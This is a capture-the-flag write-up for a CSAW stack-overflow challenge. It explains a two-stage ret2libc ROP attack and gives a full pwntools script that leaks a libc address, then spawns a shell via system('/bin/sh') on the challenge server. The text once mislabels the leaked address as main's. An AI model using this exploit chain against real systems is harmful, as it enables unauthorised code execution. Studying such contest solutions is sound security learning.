## The Beginning
This is a classic ret2lib binary exploitation problem. Source code is not given so we need to use Cutter to see the code.

The ```main``` looks like this:       

```
undefined8 main(void)
{
    char *s;
    
    init();
    puts("Hello");
    gets(&s);
    return 0;
    }
```

## Get gadgets
Use ```ROPgadget --binary rop | grep "ret"``` to get ```ret``` address ```0x40048e```        

## Or automatically get them through pwn
Like this:
```
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
```
## Find plt address for 
```
_libc_start_main_ptr = elf.symbols['__libc_start_main']
puts = elf.symbols['puts']
main = elf.symbols["main"]

```

## Create 1st rop 
The first rop is used to leak libc base address.

```
rop = base + p64(poprdi) + p64(_libc_start_main_ptr) + p64(puts) + p64(main)

```

After sending in the rop through ``` p.sendline(rop)```, we will receive an address back. This is the leaked ```main``` address.

We used ```bytes_to_long(received[-2: :-1])``` to process the address and put it into ```leaked```.
Then use this leaked to construct second rop!

## Construct second rop
We can get libc base address through ``` leaked - libc.sym["__libc_start_main"] ``` and assign it to ```libc.address```.    
```libc = ELF("libc-2.27.so")``` which is given. This libc is machine dependent. You can find out which libc you are using by ```ldd rop```, and set libc accordingly. 

The second rop is like this:
```
rop = base + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(libc.symbols["system"])

```

## Original Script

```
from pwn import *
from Crypto.Util.number import *

p = remote('pwn.chal.csaw.io', 5016)
#p = process("rop")
libc = ELF("libc-2.27.so")

elf = ELF("rop")
rop = ROP(elf)

base = b"A"*40
ret = 0x40048e
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
_libc_start_main_ptr = elf.symbols['__libc_start_main']
puts = elf.symbols['puts']
main = elf.symbols["main"]

log.info("rdi:"+hex(poprdi))
log.info("_libc_start:"+hex(_libc_start_main_ptr))
log.info("puts:"+hex(puts))

rop = base + p64(poprdi) + p64(_libc_start_main_ptr) + p64(puts) + p64(main)
log.info("Sending 1st payload: \n{}".format(hexdump(rop)))

p.recvline()
p.sendline(rop)

recieved = p.recvline()
leaked = bytes_to_long(recieved[-2: : -1])

log.info("address of leaked:"+hex(leaked))

libc.address = leaked - libc.sym["__libc_start_main"]
log.info("address of libc:" + hex(libc.address))

rop = base + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(libc.symbols["system"])
log.info("Sending real payload: \n{}".format(hexdump(rop)))

p.recvline()
p.sendline(rop)

p.interactive()
```
